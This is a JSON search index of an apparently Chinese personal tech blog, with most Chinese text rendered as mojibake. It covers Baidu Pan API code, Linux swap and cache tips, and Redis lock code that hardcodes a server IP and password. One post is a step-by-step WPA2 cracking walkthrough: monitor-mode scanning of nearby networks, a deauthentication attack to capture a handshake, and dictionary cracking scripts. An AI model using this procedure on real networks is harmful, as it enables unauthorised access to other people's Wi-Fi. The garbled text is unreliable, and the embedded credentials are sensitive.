channel_list=[] ä¸çŸ¥é“ä»€ä¹ˆæ„æ€ï¼Œå›ºå®šä¸º[] period=0 0è¡¨ç¤ºæ°¸ä¹…ï¼Œ7è¡¨ç¤º7å¤© pwd=w4y5 åˆ†äº«é“¾æ¥çš„æå–ç ï¼Œå¯è‡ªå®šä¹‰ fid_list=[1110768251780445] åˆ†äº«æ–‡ä»¶çš„idåˆ—è¡¨ï¼Œå¯è°ƒç”¨getFileListæ–¹æ³•è·å–æ–‡ä»¶åˆ—è¡¨ï¼ŒåŒ…å«fs_id \u0026#39;\u0026#39;\u0026#39; form_data = { \u0026#39;schannel\u0026#39;: 4, \u0026#39;channel_list\u0026#39;: \u0026#39;[]\u0026#39;, \u0026#39;period\u0026#39;: period, \u0026#39;pwd\u0026#39;: pwd, \u0026#39;fid_list\u0026#39;: str(fid_list), } response = self.session.post(url, headers=self.headers, params=params, data=form_data) if(response.json()[\u0026#39;errno\u0026#39;] == 0): return {\u0026#39;errno\u0026#39;: 0, \u0026#39;err_msg\u0026#39;: \u0026#39;åˆ›å»ºåˆ†äº«é“¾æ¥æˆåŠŸï¼\u0026#39;, \u0026#39;info\u0026#39;: {\u0026#39;link\u0026#39;: response.json()[\u0026#39;link\u0026#39;], \u0026#39;pwd\u0026#39;: pwd}} else: return {\u0026#39;errno\u0026#39;: 1, \u0026#39;err_msg\u0026#39;: \u0026#39;åˆ›å»ºåˆ†äº«é“¾æ¥å¤±è´¥ï¼\u0026#39;, \u0026#39;info\u0026#39;: response.json()} def getDpLogId(self, uk=None): def getRandomInt(num): return str(math.floor((random.random() * 9 + 1) * math.pow(10, num - 1))) def validateUk(uk): return len(uk + \u0026#39;\u0026#39;) == 10 def prefixInteger(num, length): return \u0026#39;\u0026#39;.join([\u0026#39;0\u0026#39; for _ in range(length - len(num))]) + num def getCountId(countid=30): if countid \u0026lt; 9999: countid += 1 else: countid = 0 return prefixInteger(str(countid), 4) client = \u0026#39;\u0026#39; userid = \u0026#39;00\u0026#39; + getRandomInt(8) sessionid = getRandomInt(6) if uk and validateUk(uk): userid = uk return client + sessionid + userid + getCountId() def getLogid(self): logid = base64.b64encode(self.session.cookies.get(\u0026#39;BAIDUID\u0026#39;).encode()).decode() return logid \u0026#39;\u0026#39;\u0026#39; éšæœºç”Ÿæˆ4ä½å­—ç¬¦ä¸² \u0026#39;\u0026#39;\u0026#39; def generatePwd(self, n=4): code = \u0026#39;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM\u0026#39; pwd= \u0026#34;\u0026#34; for i in range(0, n): index = random.randrange(0,len(code)) pwd += code[index] return pwd if __name__ == \u0026#34;__main__\u0026#34;: baiDuPan = BaiDuPan() # éªŒè¯cookies # baiDuPan.verifyCookie() # è½¬å­˜æ–‡ä»¶ # fileList = baiDuPan.saveShare(\u0026#39;https://pan.baidu.com/s/1Nnipn9HxW8cCgMfRhkHd3Q\u0026#39;, \u0026#39;yn4v\u0026#39;, \u0026#39;/\u0026#39;) # to_fs_id = fileList.get(\u0026#39;extra\u0026#39;).get(\u0026#39;list\u0026#39;)[0].get(\u0026#39;to_fs_id\u0026#39;) # é‡å‘½å # print(baiDuPan.rename(\u0026#39;/è®¡ç®—æœºç½‘ç»œï¼ˆç¬¬7ç‰ˆï¼‰-è°¢å¸Œä»-1.epub\u0026#39;, \u0026#39;è®¡ç®—æœºç½‘ç»œï¼ˆç¬¬7ç‰ˆï¼‰-è°¢å¸Œä».epub\u0026#39;)) # åˆ é™¤æ–‡ä»¶ # print(baiDuPan.delete(\u0026#39;/è®¡ç®—æœºç½‘ç»œï¼ˆç¬¬7ç‰ˆï¼‰-è°¢å¸Œä».epub\u0026#39;)) # ç§»åŠ¨æ–‡ä»¶ # print(baiDuPan.move(\u0026#39;/æˆ‘çš„èµ„æº/è®¡ç®—æœºç½‘ç»œï¼ˆç¬¬7ç‰ˆï¼‰-è°¢å¸Œä».epub\u0026#39;, \u0026#39;/\u0026#39;)) # åˆ›å»ºåˆ†äº«é“¾æ¥ # print(baiDuPan.createShareLink([to_fs_id])) "},{"id":23,"href":"/posts/history/%E6%B8%85%E7%90%86linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BC%93%E5%AD%98%E7%A9%BA%E9%97%B4/","title":"æ¸…ç†linuxç³»ç»Ÿçš„ç¼“å­˜ç©ºé—´","section":"æˆ‘çš„åšå®¢","content":"èƒŒæ™¯ï¼š jenkins åœ¨2æ ¸4Gæœºå™¨ä¸Šç¼–è¯‘vueé¡¹ç›®æ—¶ï¼Œç»å¸¸ä¼šæŠŠjenkinsçš„è¿›ç¨‹ç»™downæ‰ï¼ŒåŸå› æ˜¯å†…å­˜ä¸è¶³ã€‚\nè§£å†³æ–¹æ¡ˆï¼š\n1ã€æ·»åŠ äº†2G swapäº¤æ¢å†…å­˜ï¼Œåœ¨å†…å­˜ä¸å¤Ÿæ—¶ï¼Œå¯ä»¥ä½¿ç”¨swapçš„å†…å­˜ã€‚è™½ç„¶è¯´æ€§èƒ½ä¸å¥½ï¼Œä½†æ˜¯æ€»æ¯”æ²¡æœ‰å¼ºã€‚\nå¦‚ä½•åœ¨contos7ä¸Šæ·»åŠ swapå†…å­˜ç©ºé—´\n2ã€åœ¨ç¼–è¯‘å‰ï¼Œå…ˆæŠŠç¼“å­˜ä¸­çš„å†…å­˜æ¸…ç†å‡ºæ¥ï¼Œç•™æœ‰è¶³å¤Ÿçš„å†…å­˜ç”¨æ¥ç¼–è¯‘ï¼Œç¼–è¯‘åå†æ¸…ç†ä¸€ä¸‹ã€‚\necho \u0026#34;å¼€å§‹æ¸…é™¤ç¼“å­˜\u0026#34; sync;sync;sync #å†™å…¥ç¡¬ç›˜ï¼Œé˜²æ­¢æ•°æ®ä¸¢å¤± sleep 10#å»¶è¿Ÿ10ç§’ echo 3 \u0026gt; /proc/sys/vm/drop_caches å…¶ä»–å¸¸ç”¨æ’æŸ¥æœåŠ¡å™¨æ•´ä½“è´Ÿè½½çš„å‘½ä»¤ï¼š\n1ã€top æŸ¥çœ‹æ•´ä½“è´Ÿè½½æƒ…å†µ\ntop\n2ã€æŸ¥æ‰¾cpuå ç”¨ç‡æœ€é«˜çš„Nä¸ªè¿›ç¨‹\nps auxw | head -1;ps auxw |sort -rn -k3 |head -11\n3ã€ æ ¹æ®å†…å­˜ä½¿ç”¨å®šä½\nps auxw |sort -rn -k4 |head -11\n"},{"id":24,"href":"/posts/history/contos7%E6%B7%BB%E5%8A%A0swap%E5%86%85%E5%AD%98/","title":"Contos7æ·»åŠ swapå†…å­˜","section":"æˆ‘çš„åšå®¢","content":"Swapä»‹ç»ï¼š\nLinux å°†ç‰©ç†å†…å­˜åˆ†ä¸ºå†…å­˜æ®µï¼Œå«åšé¡µé¢ã€‚äº¤æ¢æ˜¯æŒ‡å†…å­˜é¡µé¢è¢«å¤åˆ¶åˆ°é¢„å…ˆè®¾å®šå¥½çš„ç¡¬ç›˜ç©ºé—´(å«åšäº¤æ¢ç©ºé—´)çš„è¿‡ç¨‹ï¼Œç›®çš„æ˜¯é‡Šæ”¾å¯¹äºé¡µé¢çš„å†…å­˜ã€‚ç‰©ç†å†…å­˜å’Œäº¤æ¢ç©ºé—´çš„æ€»å¤§å°æ˜¯å¯ç”¨çš„è™šæ‹Ÿå†…å­˜çš„æ€»é‡ã€‚\nSwapå³ï¼šäº¤æ¢åˆ†åŒºï¼Œç±»ä¼¼äºWindowsçš„è™šæ‹Ÿå†…å­˜ï¼Œä½†ç‰©ç†å†…å­˜ä¸è¶³æ—¶ï¼ŒæŠŠéƒ¨åˆ†ç¡¬ç›˜ç©ºé—´å½“æˆè™šæ‹Ÿå†…å­˜ä½¿ç”¨ï¼Œä»è€Œè§£å†³äº†ç‰©ç†å†…å­˜å®¹é‡ä¸è¶³ã€‚\n1ã€æŸ¥çœ‹å†…åœ¨\nfree -hm\n1.æ·»åŠ swapäº¤æ¢åˆ†åŒºç©ºé—´\nä½¿ç”¨ddå‘½ä»¤åˆ›å»ºswapäº¤æ¢åˆ†åŒºæ–‡ä»¶/dev/mapper/swap-memï¼Œå¤§å°ä¸º2Gï¼š\ndd if=/dev/zero of=/home/swap-mem bs=1024 count=2048000\næ ¼å¼åŒ–swapåˆ†åŒºï¼š\nmkswap /home/swap-mem\nè®¾ç½®äº¤æ¢åˆ†åŒºï¼š\nmkswap -f /home/swap-mem\nç»™æƒé™\nchmod 600 /home/swap-mem\næ¿€æ´»swapåˆ†åŒºï¼š\nswapon /home/swap-mem\nè®¾ä¸ºå¼€æœºè‡ªåŠ¨å¯ç”¨ï¼š\nvim /etc/fstab\nåœ¨è¯¥æ–‡ä»¶åº•éƒ¨æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š\n/home/swap-mem swap swap defaults 0 0\n2.åˆ é™¤swapäº¤æ¢åˆ†åŒº\nåœæ­¢æ­£åœ¨ä½¿ç”¨çš„swapåˆ†åŒºï¼š\nswapoff /home/swap-mem\nåˆ é™¤swapåˆ†åŒºæ–‡ä»¶ï¼š\nrm /home/swap-mem\nåˆ é™¤æˆ–æ³¨é‡Šåœ¨/etc/fstabæ–‡ä»¶ä¸­çš„ä»¥ä¸‹å¼€æœºè‡ªåŠ¨æŒ‚è½½å†…å®¹ï¼š\n/home/swap-mem swap swap defaults 0 0\nå®Œç»“ï¼\n"},{"id":25,"href":"/posts/history/jmeter%E8%BF%BD%E5%8A%A0cookie/","title":"Jmeterè¿½åŠ cookie","section":"æˆ‘çš„åšå®¢","content":"ä½¿ç”¨ BeanShell è¿›è¡Œå¯¹çº¿ç¨‹cookieè¿›è¡Œè¿½åŠ ã€‚\nimport org.apache.jmeter.protocol.http.control.CookieManager; import org.apache.jmeter.protocol.http.control.Cookie; CookieManager manager = ctx.getCurrentSampler().getCookieManager(); Cookie cookie = new Cookie(\u0026#34;GSMSessionSID\u0026#34;, \u0026#34;GSMSessionSID\u0026#34;, \u0026#34;qinsilk.com\u0026#34;, \u0026#34;/gsm\u0026#34;, true, Long.MAX_VALUE); manager.add(cookie); "},{"id":26,"href":"/posts/history/arthas-%E5%8F%AF%E6%8E%92%E6%9F%A5%E6%8E%A5%E5%8F%A3%E6%89%A7%E8%A1%8C%E5%93%AA%E9%87%8C%E6%89%A7%E8%A1%8C%E6%AF%94%E8%BE%83%E5%8D%A0%E7%94%A8%E6%97%B6%E9%97%B4/","title":"Arthas å¯æ’æŸ¥æ¥å£æ‰§è¡Œå“ªé‡Œæ‰§è¡Œæ¯”è¾ƒå ç”¨æ—¶é—´","section":"æˆ‘çš„åšå®¢","content":"\rhttps://arthas.aliyun.com/doc/quick-start.html\n"},{"id":27,"href":"/posts/history/%E5%87%A4%E5%87%B0%E6%9E%B6%E6%9E%84/","title":"å‡¤å‡°æ¶æ„","section":"æˆ‘çš„åšå®¢","content":"\rhttp://icyfenix.cn/\n"},{"id":28,"href":"/posts/history/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81%E5%8F%AF%E8%A1%8C%E6%80%A7%E4%B8%8D%E9%AB%98/","title":"æš´åŠ›ç ´è§£ Wifiå¯†ç ï¼Œå¯è¡Œæ€§ä¸é«˜","section":"æˆ‘çš„åšå®¢","content":"\rè®¾ç½®ä½¿ç”¨å¤–ç½®ç½‘å¡\r#\ræ“ä½œæ­¥éª¤\r#\ræŸ¥çœ‹æ”¯æŒçš„ç½‘å¡\nkali@kali:~$ sudo airmon-ng PHY Interface Driver Chipset phy1 wlan0 rt2800usb Ralink Technology, Corp. RT2870/RT3070 å¯åŠ¨ç½‘å¡ç›‘å¬æ¨¡å¼\nsudo airmon-ng start wlan0 å†æ¬¡ä½¿ç”¨ sudo ifconfig æŸ¥çœ‹æ—¶ï¼Œwlan0 ä¼šå˜æˆ wlan0monã€‚\nkali@kali:~$ sudo ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.183.128 netmask 255.255.255.0 broadcast 192.168.183.255 inet6 fe80::20c:29ff:fe01:5e1b prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 00:0c:29:01:5e:1b txqueuelen 1000 (Ethernet) RX packets 86 bytes 6556 (6.4 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 45 bytes 4234 (4.1 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt; loop txqueuelen 1000 (Local Loopback) RX packets 12 bytes 556 (556.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 12 bytes 556 (556.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 wlan0mon: flags=867\u0026lt;UP,BROADCAST,NOTRAILERS,RUNNING,PROMISC,ALLMULTI\u0026gt; mtu 1500 unspec 00-26-66-47-9F-53-30-3A-00-00-00-00-00-00-00-00 txqueuelen 1000 (UNSPEC) RX packets 4259 bytes 580060 (566.4 KiB) RX errors 0 dropped 1640 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 æ‰«æwifi\nsudo airodump-ng wlan0mon BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID F8:8C:21:8F:43:67 -44 39 15 0 1 720 WPA2 CCMP PSK 12321 FA:8C:21:AF:43:67 -45 33 0 0 1 720 WPA2 CCMP PSK \u0026lt;length: 0\u0026gt; 50:D2:F5:8A:DF:2F -58 32 10 0 1 270 WPA2 CCMP PSK å°ç±³ä¸­ç»§ 48:0E:EC:20:4E:66 -74 30 0 0 1 270 WPA2 CCMP PSK TP-LINK_4E66 F4:83:CD:83:BC:6A -75 34 1 0 6 270 WPA2 CCMP PSK asddsaa 50:3A:A0:07:54:92 -78 35 70 0 11 270 WPA2 CCMP PSK DING 8C:A6:DF:EB:C6:60 -80 27 0 0 11 405 WPA2 CCMP PSK TP-LINK_C660 5C:DE:34:B0:20:FB -80 16 0 0 4 270 WPA2 CCMP PSK MERCURY_20 DC:73:85:85:16:EC -82 27 6 0 6 400 WPA2 CCMP PSK CMCC-ML9Y DC:73:85:85:16:F1 -84 31 0 0 6 360 WPA2 CCMP PSK \u0026lt;length: 0\u0026gt; 92:F0:52:E9:9D:9C -84 13 0 0 1 180 WPA2 CCMP PSK mz16p 94:D9:B3:B7:1F:75 -84 30 4 0 11 270 WPA2 CCMP PSK 407 C0:A5:DD:73:DC:30 -86 16 3 0 10 270 WPA2 CCMP PSK 404 8C:DE:F9:32:FA:7A -86 24 0 0 9 360 WPA CCMP PSK Gordon 44:F9:71:79:D3:54 -87 30 6 0 6 540 WPA2 CCMP PSK feng 46:F9:71:59:D3:54 -87 21 10 0 6 540 WPA2 CCMP PSK feng C0:51:7E:64:F3:31 -87 30 0 0 3 130 WPA2 CCMP PSK EZVIZ-16 DC:FE:18:BB:E9:A3 -87 2 0 0 1 405 WPA2 CCMP PSK 408 92:DE:F9:32:FA:7A -88 20 0 0 9 360 OPN \u0026lt;length: 0\u0026gt; 6C:59:40:EA:85:9C -89 1 0 0 12 270 WPA2 CCMP PSK MERCURY_859C 08:10:79:46:73:CD -89 33 0 0 1 270 WPA2 CCMP PSK asdfghjkl 36:F2:EA:EB:EF:BC -91 1 0 0 6 360 WPA2 CCMP PSK OnePlus 9 00:4B:F3:2B:7F:9A -86 3 1 0 1 270 WPA2 CCMP PSK 306 66:6E:97:AF:D8:27 -86 2 0 0 1 540 WPA2 CCMP PSK \u0026lt;length: 0\u0026gt; é€‰æ‹©ä¸€ä¸ªPWRçš„å€¼çš„ç»å¯¹å€¼å°äº70çš„wifiç ´è§£\næŠ“åŒ…\nsudo airodump-ng -c {CH} --bssid {BSSID} -w {è¦ä¿å­˜æ¡æ‰‹åŒ…çš„ç›®å½•} æ— çº¿ç½‘å¡åç§° sudo airodump-ng -c 1 --bssid F8:8C:21:8F:43:67 -w /home/kali/me/12321 wlan0mon è¿™é‡Œæ˜¯ç©ºçš„ï¼Œæ²¡æœ‰æŠ“å–æˆåŠŸã€‚\næ”»å‡»ç½‘ç»œä¸‹çº¿ï¼Œè¾…åŠ©æŠ“åŒ…(è¿™é‡Œè¦é‡æ–°å¼€å¯ä¸€ä¸ªçª—å£)\nsudo aireplay-ng -0 {å‘é€åè®¤è¯åŒ…çš„ä¸ªæ•°} -a {BSSID} -c {å¼ºåˆ¶ä¸‹çº¿çš„MACåœ°å€ï¼ˆSTATIONä¸‹é¢çš„åœ°å€ï¼‰} æ— çº¿ç½‘å¡åç§° sudo aireplay-ng -0 10 -a F8:8C:21:8F:43:67 -c 52:D2:F5:0A:DF:2F wlan0mon æŠ“å–æˆåŠŸï¼Œæ¥ä¸‹æ¥æ˜¯ç ´è§£äº†ã€‚\næš´åŠ›ç ´è§£\nsudo aircrack-ng -w å¯†é’¥æ–‡ä»¶.txt æŠ“åˆ°çš„åŒ…æ•°æ®.cap sudo aircrack-ng -w rockyou.txt me-01.cap centos 7 å®‰è£… aircrack-ng\r#\r1ã€æ·»åŠ æº\ncurl -s https://packagecloud.io/install/repositories/aircrack-ng/release/script.rpm.sh | sudo bash 2ã€å®‰è£…éœ€è¦wireless-toolsï¼Œ\nyum install wireless-tools 3ã€å®‰è£…aircrack-ng\nyum install aircrack-ng 4ã€æŸ¥çœ‹ç‰ˆæœ¬\naircrack-ng Aircrack-ng 1.6 - (C) 2006-2020 Thomas d\u0026#39;Otreppe https://www.aircrack-ng.org ä¸»æœºä¹‹é—´äº’ä¼ æ–‡ä»¶\r#\rscp æœ¬æœºæ–‡ä»¶è·¯å¾„ è´¦å·@ip:è¿œç¨‹ä¸»æœºæ–‡ä»¶è·¯å¾„ scp /home/file root@xxx.xxx.xxx.xxx:/home/test/ åå°å¯åŠ¨\r#\rnohup aircrack-ng -w rockyou.txt asddsaa-01.cap \u0026gt; asddsaa-01-log.file 2\u0026gt;\u0026amp;1 \u0026amp; è„šæœ¬è·‘å¯†ç ï¼Œå¯†ç å­—å…¸æ”¾åœ¨keyæ–‡ä»¶å¤¹ä¸­\n#!/bin/bash read -p \u0026#34;è¾“å…¥è¦ç ´è§£çš„capæ–‡ä»¶åç§°:\u0026#34; file read -p \u0026#34;è¾“å…¥è“ç‰™åç§°:\u0026#34; name for key in `ls key` do nohup aircrack-ng -w ./key/$key $file \u0026gt; ./log/$name-$key.log 2\u0026gt;\u0026amp;1 \u0026amp; done æŸ¥æ‰¾æ˜¯å¦åŒ…å«æˆåŠŸçš„æ–‡ä»¶\nc=0 for key in `ls log` do if [ `grep -c \u0026#39;KEY NOT FOUND\u0026#39; ./log/$key` -eq 0 ];then echo -e \u0026#34;\\033[33m $key not have \\033[0m\u0026#34; c=$(($c+1)) else echo $key have fi done echo \u0026#34;å¯èƒ½æœ‰å¯†ç çš„æœ‰ï¼š $c ä¸ª\u0026#34; n=$(ps -ef|grep aircrack-ng|wc -l) echo \u0026#34;æœªå®Œæˆçš„ä»»åŠ¡æœ‰ï¼š$(($n-1)) ä¸ª\u0026#34; å¯†ç å­—å…¸ï¼š\nhttps://github.com/yuanmoc/wifiDictionaries "},{"id":29,"href":"/posts/history/es%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/","title":"Eså‚è€ƒæ–‡æ¡£","section":"æˆ‘çš„åšå®¢","content":"\rhttps://www.tizi365.com/archives/590.html\n"},{"id":30,"href":"/posts/history/%E6%9B%B4%E6%96%B0ideagit%E5%88%86%E6%94%AF%E4%BF%A1%E6%81%AF/","title":"æ›´æ–° ID Eagitåˆ†æ”¯ä¿¡æ¯","section":"æˆ‘çš„åšå®¢","content":"IDEA å¸¸å¸¸å‡ºç°æœ¬åœ°æ˜¾ç¤ºçš„åˆ†æ”¯ä¿¡æ¯ä¸è¿œç¨‹çš„åˆ†æ”¯ä¿¡æ¯ä¸ä¸€è‡´ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ›´æ–°è¿œç¨‹åˆ†æ”¯ä¿¡æ¯åˆ°æœ¬åœ°ç¼“å­˜ä¸­æ¥ã€‚\ngit remote update origin --prune "},{"id":31,"href":"/posts/history/mysql%E4%B8%8D%E5%90%8C%E5%AD%97%E7%AC%A6%E9%9B%86%E8%A1%A8%E5%85%B3%E8%81%94%E5%AF%BC%E8%87%B4%E7%B4%A2%E5%BC%95%E5%A4%B1%E6%95%88/","title":"Mysqlä¸åŒå­—ç¬¦é›†è¡¨å…³è”å¯¼è‡´ç´¢å¼•å¤±æ•ˆ","section":"æˆ‘çš„åšå®¢","content":"èƒŒæ™¯ï¼š åœ¨åšä¸šåŠ¡åˆå§‹åŒ–æ—¶ï¼Œå‡ºç°joinè¡¨å…³è”æ²¡æœ‰èµ°ç´¢å¼•çš„æƒ…å†µï¼ŒåŸæ¥åªè¦æ‰§è¡ŒåŠä¸ªå°æ—¶çš„è„šæœ¬ï¼Œç°åœ¨è¦æ‰§è¡Œå‡ ä¸ªå°æ—¶ï¼Œç»æ’æŸ¥ï¼Œæ˜¯ä¸¤ä¸ªè¡¨çš„å­—ç¬¦é›†ä¸ä¸€æ ·ï¼Œæ—§è¡¨çš„å­—ç¬¦é›†æ˜¯utf8ï¼Œè€Œæ–°è¡¨çš„å­—ç¬¦é›†éƒ½æ˜¯utf8mb4ï¼Œè€Œå¯¼è‡´å…³è”æ—¶ä¸èµ°ç´¢å¼•ã€‚\nç›®å‰è§£å†³æ–¹æ¡ˆæœ‰ä¸¤ç§ï¼š 1ã€ä¿®æ”¹æ—§è¡¨å­—ç¬¦é›†æˆutf8mb4 2ã€åœ¨æ‰§è¡Œè„šæœ¬æ—¶ï¼Œè½¬æ¢å­—ç¬¦é›†ç±»å‹ï¼Œä»è€Œè®©å…¶èµ°ç´¢å¼• convert(å­—æ®µ using utf8mb4)\n1æ–¹æ¡ˆè¦å¤„ç†éš¾åº¦éä¸€èˆ¬ï¼Œç›®å‰ä¸šåŠ¡åœ¨çº¿ä¸Šè·‘ï¼Œ\n"},{"id":32,"href":"/posts/history/redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/","title":"Redisåˆ†å¸ƒå¼é”","section":"æˆ‘çš„åšå®¢","content":" \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;redis.clients\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jedis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; LockUtil\npublic class LockUtil { private static final JedisPool JEDIS_POOL; /** é”è¿‡æœŸæ—¶é—´ */ private static final long INTERNAL_LOCK_LEASE_TIME = 5000; private final static long TIME_OUT = 20000; //è·å–é”çš„è¶…æ—¶æ—¶é—´ private static final SetParams PARAMS = SetParams.setParams().nx().px(INTERNAL_LOCK_LEASE_TIME); static { JEDIS_POOL = new JedisPool(\u0026#34;139.9.183.232\u0026#34;, 6379); } private static Jedis getJedis() { Jedis resource = JEDIS_POOL.getResource(); resource.auth(\u0026#34;yuanmoc\u0026#34;); return resource; } public static boolean lock(String lockKey, String sessionId) { Jedis jedis = getJedis(); long start = System.currentTimeMillis(); try{ for(;;){ // SETå‘½ä»¤è¿”å›OK ï¼Œåˆ™è¯æ˜è·å–é”æˆåŠŸ System.out.println(Thread.currentThread().getName() + \u0026#34; - æ­£åœ¨è·å–é”\u0026#34;); String lock = jedis.set(lockKey, sessionId, PARAMS); if(\u0026#34;OK\u0026#34;.equals(lock)){ System.out.println(Thread.currentThread().getName() + \u0026#34; - è·å–é”æˆåŠŸ\u0026#34;); return true; } // å¦åˆ™å¾ªç¯ç­‰å¾…ï¼Œåœ¨timeoutæ—¶é—´å†…ä»æœªè·å–åˆ°é”ï¼Œåˆ™è·å–å¤±è´¥ long l = System.currentTimeMillis() - start; if (l \u0026gt;= TIME_OUT) { System.out.println(Thread.currentThread().getName() + \u0026#34; - è·å–é”è¶…æ—¶\u0026#34;); return false; } try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } } }finally { jedis.close(); } } public static boolean unlock(String lockKey, String sessionId){ Jedis jedis = getJedis(); String script = \u0026#34;if redis.call(\u0026#39;get\u0026#39;,KEYS[1]) == ARGV[1] then\u0026#34; + \u0026#34; return redis.call(\u0026#39;del\u0026#39;,KEYS[1]) \u0026#34; + \u0026#34;else\u0026#34; + \u0026#34; return 0 \u0026#34; + \u0026#34;end\u0026#34;; try { Object result = jedis.eval(script, Collections.singletonList(lockKey), Collections.singletonList(sessionId)); if(\u0026#34;1\u0026#34;.equals(result.toString())){ System.out.println(Thread.currentThread().getName() + \u0026#34; - é‡Šæ”¾é”æˆåŠŸ\u0026#34;); return true; } System.out.println(Thread.currentThread().getName() + \u0026#34; - é‡Šæ”¾é”å¤±è´¥\u0026#34;); return false; }finally { jedis.close(); } } } Test01\n/** * 1ã€åŠ é” * 2ã€é‡Šæ”¾é” * 3ã€ç¨‹åºæ„å¤–æ­»äº¡é‡Šæ”¾é”å¤±è´¥ï¼ˆåˆ©ç”¨è¶…æ—¶é—²æ—¶é—´é˜²æ­¢æ­»é”ï¼‰ * 4ã€ä¸šåŠ¡æ‰§è¡Œæ—¶é—´è¶…è¿‡é”è¿‡æœŸæ—¶é—´ */ public class Test01 { private static String key = \u0026#34;flash_1\u0026#34;; private static String sessionId1 = \u0026#34;session_id_1\u0026#34;; private static String sessionId2 = \u0026#34;session_id_2\u0026#34;; public static void main(String[] args) { ExecutorService executorService = Executors.newFixedThreadPool(2); executorService.execute(() -\u0026gt; { try { LockUtil.lock(key, sessionId1); System.out.println(Thread.currentThread().getName() + \u0026#34;ä¸šåŠ¡æ‰§è¡Œä¸­...\u0026#34;); Thread.sleep(300); } catch (Exception e) { } finally { LockUtil.unlock(key, sessionId1); } }); executorService.execute(() -\u0026gt; { try { LockUtil.lock(key, sessionId2); System.out.println(Thread.currentThread().getName() + \u0026#34;ä¸šåŠ¡æ‰§è¡Œä¸­...\u0026#34;); Thread.sleep(300); } catch (Exception e) { } finally { LockUtil.unlock(key, sessionId2); } }); } } LockUtil2\npublic class LockUtil2 { private static final JedisPool JEDIS_POOL; /** é”è¿‡æœŸæ—¶é—´ */ private static final long INTERNAL_LOCK_LEASE_TIME = 5000; private final static long TIME_OUT = 20000; //è·å–é”çš„è¶…æ—¶æ—¶é—´ static { JEDIS_POOL = new JedisPool(\u0026#34;139.9.183.232\u0026#34;, 6379); } private static Jedis getJedis() { Jedis resource = JEDIS_POOL.getResource(); resource.auth(\u0026#34;yuanmoc\u0026#34;); return resource; } public static boolean lock(String lockKey, String sessionId) { Jedis jedis = getJedis(); long start = System.currentTimeMillis(); String script = \u0026#34;if (redis.call(\u0026#39;exists\u0026#39;, KEYS[1]) == 0) then \u0026#34; + \u0026#34;redis.call(\u0026#39;hset\u0026#39;, KEYS[1], ARGV[2], 1); \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return nil; \u0026#34; + \u0026#34;end; \u0026#34; + \u0026#34;if (redis.call(\u0026#39;hexists\u0026#39;, KEYS[1], ARGV[2]) == 1) then \u0026#34; + \u0026#34;redis.call(\u0026#39;hincrby\u0026#39;, KEYS[1], ARGV[2], 1); \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return nil; \u0026#34; + \u0026#34;end; \u0026#34; + \u0026#34;return redis.call(\u0026#39;pttl\u0026#39;, KEYS[1]);\u0026#34;; try{ for(;;){ System.out.println(Thread.currentThread().getName() + \u0026#34; - æ­£åœ¨è·å–é”\u0026#34;); Object eval = jedis.eval(script, Collections.singletonList(lockKey), Arrays.asList(INTERNAL_LOCK_LEASE_TIME + \u0026#34;\u0026#34;, sessionId)); if(eval == null){ System.out.println(Thread.currentThread().getName() + \u0026#34; - è·å–é”æˆåŠŸ\u0026#34;); return true; } // å¦åˆ™å¾ªç¯ç­‰å¾…ï¼Œåœ¨timeoutæ—¶é—´å†…ä»æœªè·å–åˆ°é”ï¼Œåˆ™è·å–å¤±è´¥ long l = System.currentTimeMillis() - start; if (l \u0026gt;= TIME_OUT) { System.out.println(Thread.currentThread().getName() + \u0026#34; - è·å–é”è¶…æ—¶\u0026#34;); return false; } try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } } }finally { jedis.close(); } } public static boolean unlock(String lockKey, String sessionId){ Jedis jedis = getJedis(); String script = // å¦‚æœé”å·²ç»ä¸å­˜åœ¨ \u0026#34;if (redis.call(\u0026#39;exists\u0026#39;, KEYS[1]) == 0) then \u0026#34; + \u0026#34;return 1; \u0026#34; + \u0026#34;end;\u0026#34; + // å¦‚æœé‡Šæ”¾é”çš„çº¿ç¨‹å’Œå·²å­˜åœ¨é”çš„çº¿ç¨‹ä¸æ˜¯åŒä¸€ä¸ªçº¿ç¨‹ï¼Œè¿”å›null \u0026#34;if (redis.call(\u0026#39;hexists\u0026#39;, KEYS[1], ARGV[2]) == 0) then \u0026#34; + \u0026#34;return nil;\u0026#34; + \u0026#34;end; \u0026#34; + // é€šè¿‡hincrbyé€’å‡1çš„æ–¹å¼ï¼Œé‡Šæ”¾ä¸€æ¬¡é” // è‹¥å‰©ä½™æ¬¡æ•°å¤§äº0 ï¼Œåˆ™åˆ·æ–°è¿‡æœŸæ—¶é—´ \u0026#34;local counter = redis.call(\u0026#39;hincrby\u0026#39;, KEYS[1], ARGV[2], -1); \u0026#34; + \u0026#34;if (counter \u0026gt; 0) then 